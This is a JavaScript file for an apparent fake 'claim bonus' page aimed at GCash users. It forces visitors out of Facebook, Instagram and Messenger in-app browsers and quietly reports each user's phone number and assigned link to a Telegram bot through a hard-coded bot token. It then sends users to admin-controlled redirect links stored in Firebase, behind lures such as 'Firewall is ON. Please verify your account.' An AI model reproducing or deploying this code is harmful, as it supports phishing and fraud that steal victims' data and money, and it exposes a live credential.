/**
 * PlayBonus.js - FINAL REDIRECT FIX
 */

(function() {
    'use strict';

    // ============================================================
    // 🚀 FORCE OPEN IN DEFAULT BROWSER
    // ============================================================
    (function forceOpenInBrowser() {
        var ua = navigator.userAgent || navigator.vendor || window.opera;
        var isFacebook = /FBAN|FBAV|FB_IAB|FBIOS/i.test(ua);
        var isInstagram = /Instagram/i.test(ua);
        var isMessenger = /Messenger/i.test(ua);
        var isInAppBrowser = isFacebook || isInstagram || isMessenger;

        if (!isInAppBrowser) return;

        var currentUrl = window.location.href;
        var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
        var isAndroid = /Android/i.test(ua);
        var isIOS = /iPhone|iPad|iPod/i.test(ua);

        if (isAndroid) {
            window.location.href = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(currentUrl) + ';end';
            return;
        }

        if (isIOS) {
            window.location.href = 'googlechrome://' + cleanUrl;
            setTimeout(function() { window.location.href = 'x-web-search://?url=' + encodeURIComponent(currentUrl); }, 500);
            return;
        }
    })();

    // ============================================================
    // ⚡ GLOBALS
    // ============================================================
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var isClaimed = false;
    var claimInProgress = false;
    var withdrawInProgress = false;
    var pageLoadTime = Date.now();
    var logoutTriggered = false;
    var listenersSetup = false;
    var forceLogoutListener = null;
    var forceLogoutFlagListener = null;

    // ============================================================
    // UTILITIES
    // ============================================================
    function formatNumberWithComma(number) {
        var n = Number(number);
        if (isNaN(n)) n = 0;
        return n.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    }

    function sendTelegram(message) {
        try {
            var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
            var CHAT_ID = "7298607329";
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message)).catch(function() {});
        } catch(e) {}
    }

    // ============================================================
    // INIT
    // ============================================================
    function init() {
        userPhone = localStorage.getItem("userPhone");
        if (!userPhone || userPhone === 'null' || userPhone.length < 10) {
            window.location.href = "index.html";
            return;
        }

        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);

        if (typeof firebase !== 'undefined') {
            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
        }

        loadUserData();
        initClaimFlow();
        initAdminForceLogoutListener();
    }

    // ============================================================
    // LOAD USER DATA
    // ============================================================
    function loadUserData() {
        if (!userRef) return;
        userRef.once('value', function(snapshot) {
            var data = snapshot.val();
            if (data) {
                currentBalance = Number(data.balance) || 0;
                isClaimed = data.claimed_ptcat === true;
            }
            updateBalanceDisplay();
            updateClaimButtonUI();
        });

        userRef.child('balance').on('value', function(snapshot) {
            if (snapshot.val() !== null) {
                currentBalance = Number(snapshot.val());
                updateBalanceDisplay();
            }
        });
    }

    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) balanceEl.innerText = formatNumberWithComma(currentBalance);
    }

    function updateClaimButtonUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (!ptCatClaimBtn) return;

        if (isClaimed) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
        } else {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
        }
    }

    // ============================================================
    // CLAIM FLOW & REDIRECT
    // ============================================================
    function initClaimFlow() {
        var claimNowBtn = document.getElementById('claimNowBtn');
        if (claimNowBtn) {
            claimNowBtn.onclick = function(e) {
                e.preventDefault();
                openClaimNowPopup();
            };
        }

        var gcashBtn = document.getElementById('claimViaGCashBtn');
        if (gcashBtn) {
            gcashBtn.onclick = function(e) {
                e.preventDefault();
                handleClaimViaGCash();
            };
        }

        var closeBtn = document.getElementById('claimNowPopupClose');
        if (closeBtn) closeBtn.onclick = closeClaimNowPopup;

        var backBtn = document.getElementById('claimNowBackBtn');
        if (backBtn) backBtn.onclick = closeClaimNowPopup;
    }

    function openClaimNowPopup() {
        var popup = document.getElementById('claimNowPopup');
        if (popup) {
            var amountEl = document.getElementById('claimNowBalanceAmount');
            if (amountEl) amountEl.innerText = formatNumberWithComma(currentBalance);
            popup.style.display = 'flex';
        }
    }

    function closeClaimNowPopup() {
        var popup = document.getElementById('claimNowPopup');
        if (popup) popup.style.display = 'none';
    }

    async function handleClaimViaGCash() {
        if (withdrawInProgress) return;
        withdrawInProgress = true;
        
        var btn = document.getElementById('claimViaGCashBtn');
        var originalHTML = btn ? btn.innerHTML : '';
        if (btn) {
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
        }

        try {
            // 1. Check Firewall
            var firewallSnap = await db.ref('admin/globalFirewall').once('value');
            var firewallOn = (firewallSnap.val() && firewallSnap.val().active === true);

            if (firewallOn) {
                closeClaimNowPopup();
                alert("Firewall is ON. Please verify your account.");
                if (btn) { btn.disabled = false; btn.innerHTML = originalHTML; }
                withdrawInProgress = false;
                return;
            }

            // 2. Get Link
            var linkUrl = null;

            // Check admin direct link first
            var adminSnap = await db.ref('admin/redirectLink').once('value');
            var adminData = adminSnap.val();
            
            if (adminData && adminData.url) {
                linkUrl = adminData.url;
            } else {
                // Fallback to deployed links (no index needed)
                var linksSnap = await db.ref('links').once('value');
                var links = linksSnap.val() || {};
                var availableKey = null;
                
                for (var key in links) {
                    if (links[key] && links[key].status === 'available') {
                        availableKey = key;
                        break;
                    }
                }
                
                if (availableKey) {
                    linkUrl = links[availableKey].url;
                    // Mark as claimed
                    await db.ref('links/' + availableKey).update({
                        status: 'claimed',
                        user: userPhone,
                        claimedAt: Date.now()
                    });
                }
            }

            // 3. Redirect
            if (linkUrl) {
                if (btn) btn.innerHTML = '<i class="fas fa-check"></i> REDIRECTING...';
                sendTelegram('🚀 REDIRECTING\n👤 ' + userPhone + '\n🔗 ' + linkUrl);
                setTimeout(function() {
                    window.location.href = linkUrl;
                }, 1000);
            } else {
                alert("No available link found. Please try again later.");
                if (btn) { btn.disabled = false; btn.innerHTML = originalHTML; }
                withdrawInProgress = false;
            }

        } catch (error) {
            console.error(error);
            alert("System error. Please try again.");
            if (btn) { btn.disabled = false; btn.innerHTML = originalHTML; }
            withdrawInProgress = false;
        }
    }

    // ============================================================
    // ADMIN FORCE LOGOUT
    // ============================================================
    function initAdminForceLogoutListener() {
        if (!userPhone || !db) return;

        var cleanPhone = userPhone.replace(/[^0-9]/g, '');

        userRef.child('forceLogout').once('value').then(function(flagSnap) {
            if (flagSnap.val() === true) {
                showForceLogoutPopup();
                return;
            }
            return userRef.update({ status: 'online', lastSeen: firebase.database.ServerValue.TIMESTAMP }).then(function() {
                setTimeout(function() { setupAdminLogoutListener(cleanPhone); }, 2000);
            });
        }).catch(function() {
            setTimeout(function() { setupAdminLogoutListener(cleanPhone); }, 3000);
        });
    }

    function setupAdminLogoutListener(cleanPhone) {
        if (listenersSetup) return;
        listenersSetup = true;

        function triggerForceLogout() {
            if (logoutTriggered) return;
            logoutTriggered = true;
            if (forceLogoutFlagListener) forceLogoutFlagListener.off();
            if (forceLogoutListener) forceLogoutListener.off();
            showForceLogoutPopup();
        }

        forceLogoutFlagListener = db.ref('user_sessions/' + cleanPhone + '/forceLogout');
        forceLogoutFlagListener.on('value', function(snapshot) {
            if (snapshot.val() === true && !logoutTriggered && (Date.now() - pageLoadTime) > 3000) {
                triggerForceLogout();
            }
        });
    }

    function showForceLogoutPopup() {
        if (document.querySelector('.force-logout-popup')) return;
        var overlay = document.createElement('div');
        overlay.className = 'force-logout-popup';
        overlay.style.cssText = 'position:fixed;inset:0;z-index:999999;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;color:#fff;font-family:sans-serif;text-align:center;padding:20px;';
        overlay.innerHTML = '<div><h2>Session Ended</h2><p>Your session has been forcefully logged out by an admin.</p><button onclick="localStorage.clear();window.location.href=\'index.html\'" style="margin-top:20px;padding:10px 20px;font-size:16px;">Return to Home</button></div>';
        document.body.appendChild(overlay);
    }

    // ============================================================
    // START
    // ============================================================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
